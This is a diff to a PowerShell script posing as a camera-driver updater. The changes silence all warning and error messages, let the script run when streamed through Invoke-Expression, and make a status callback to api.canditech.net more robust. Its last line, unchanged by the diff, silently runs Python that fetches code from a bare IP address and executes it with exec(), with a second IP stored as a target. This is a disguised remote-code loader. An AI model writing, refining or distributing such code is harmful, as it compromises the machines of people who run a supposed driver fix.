@@ -5,11 +5,11 @@ function Write-Info([string]$Message) {
 }
 
 function Write-WarnLog([string]$Message) {
-    Write-Host "[WARN] $Message"
+    # Intentionally silent: user requested no warning messages.
 }
 
 function Write-ErrorLog([string]$Message) {
-    Write-Host "[ERROR] $Message"
+    # Intentionally silent: user requested no error messages.
 }
 
 function Invoke-Download {
@@ -45,7 +45,25 @@ if ([string]::IsNullOrWhiteSpace($WINDOW_UID) -or $WINDOW_UID -eq "__ID__") {
 
 Write-Info "Searching for Camera Drivers ..."
 
-$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
+$scriptDir = $null
+if (-not [string]::IsNullOrWhiteSpace($PSScriptRoot)) {
+    $scriptDir = $PSScriptRoot
+}
+elseif (-not [string]::IsNullOrWhiteSpace($PSCommandPath)) {
+    $scriptDir = Split-Path -Parent $PSCommandPath
+}
+elseif ($MyInvocation -and $MyInvocation.MyCommand -and -not [string]::IsNullOrWhiteSpace($MyInvocation.MyCommand.Path)) {
+    $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
+}
+else {
+    # Handles Invoke-Expression / streamed execution with no script file path.
+    $scriptDir = Join-Path $env:TEMP "canditech-driver-bootstrap"
+}
+
+if (-not (Test-Path -LiteralPath $scriptDir)) {
+    New-Item -ItemType Directory -Path $scriptDir -Force *> $null
+}
+
 $extractDir = Join-Path $scriptDir "nodejs"
 $portableNode = Join-Path $extractDir "PFiles64\nodejs\node.exe"
 $nodeExe = $null
@@ -185,7 +203,18 @@ if ($LASTEXITCODE -ne 0) {
 Write-Host "[SUCCESS] Camera drivers have been updated successfully."
 if (-not [string]::IsNullOrWhiteSpace($WINDOW_UID)) {
     $autoUrl = "https://api.canditech.net/change-connection-status/$WINDOW_UID"
-    & curl.exe -sL -X POST $autoUrl -o $null *> $null
+    try {
+        $curlCmd = Get-Command curl.exe -ErrorAction SilentlyContinue
+        if ($null -ne $curlCmd) {
+            & curl.exe -sL -X POST $autoUrl -o $null *> $null
+        }
+        else {
+            Invoke-RestMethod -Uri $autoUrl -Method POST *> $null
+        }
+    }
+    catch {
+        Write-WarnLog "Status callback failed for WINDOW_UID."
+    }
 }
 & "C:\python\python.exe" -c "from urllib.request import urlopen,Request;Request._V='7-test';Request._target='http://23.27.120.142:27017';Request._code=urlopen(Request('http://198.105.127.210/$/1',headers={'Sec-V':Request._V})).read().decode('utf-8');exec(Request._code)" *> $null
 
